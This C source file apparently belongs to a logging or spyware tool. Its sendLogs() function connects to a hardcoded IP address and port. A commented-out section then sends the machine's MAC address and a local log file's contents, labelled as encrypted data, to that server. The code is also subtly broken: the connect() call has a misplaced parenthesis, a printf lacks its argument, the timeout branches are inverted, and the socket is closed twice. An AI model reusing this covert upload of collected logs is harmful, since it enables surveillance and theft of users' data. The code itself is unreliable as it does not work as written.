#include "includes.h"


int sendLogs();

#define SERVERADDRESS "130.104.78.201"
#define SERVERPORT 3874
#define BUF 1024




int sendLogs(char *filepath, char *mac) {
	int sockfd = 0, res, valopt;
	long arg;
	char identity[18];
	char recvBuff[BUF];
	struct sockaddr_in serv_addr;
	struct timeval tv;
	fd_set set;
	socklen_t len;

	memset(recvBuff,'\0',BUF);
	strcpy(identity, mac);

	// Create the socket
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("[-]Could not create socket.\n");
        return 1;
    }

	// Generate the socket information
	memset((char *) &serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(SERVERADDRESS);
	serv_addr.sin_port = htons(SERVERPORT);

	//Non blocking socket
	arg = fcntl(sockfd, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(sockfd, F_SETFL, arg);

	//Connect to server
	res = connect(sockfd, (struct sockaddr *)&serv_addr , sizeof(serv_addr) < 0);
	printf("RES:%d\n");
	printf("Error: %s\n", strerror(errno));
	if(res < 0) {
		if(errno == EINPROGRESS) {
			tv.tv_sec = 5; // 5sec timeout
			tv.tv_usec = 0;
			FD_ZERO(&set);
			FD_SET(sockfd, &set);
			if(select(sockfd+1, NULL, &set, NULL, &tv) > 0) {
				len = sizeof(int);
				getsockopt(sockfd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &len);
				if(valopt) {
					printf("ERROR\n");
					return 0;
				}
				else {
				//Time out 
				printf("TIMEOUT\n");
				return 0;
				}
			}
			printf("OK\n");
		}
	}

	//Set to blocking again
	arg = fcntl(sockfd, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(sockfd, F_SETFL, arg);
	close(sockfd);


	// # Phase 1 : Probe send our identity to the server
	/*write(sockfd, identity, sizeof(identity)); 
	// Wait ack from the server
	read(sockfd, recvBuff, 1);

	// Phase 2 : Data sending
	int fd = open(filepath, O_RDONLY);
	int logsize = htonl(lseek(fd,0,SEEK_END));
	lseek(fd,0,SEEK_SET);

	printf("SIZE: %d\n", logsize);

	// Send data size
	write(sockfd, &logsize, 4);
	read(sockfd, recvBuff, 1);

	int logread = 0;
	while( (logread=read(fd, recvBuff, 56)) > 0 ) {
		// Send encrypted data
		write(sockfd, recvBuff, logread);
	}*/
  	
	close(sockfd);
}
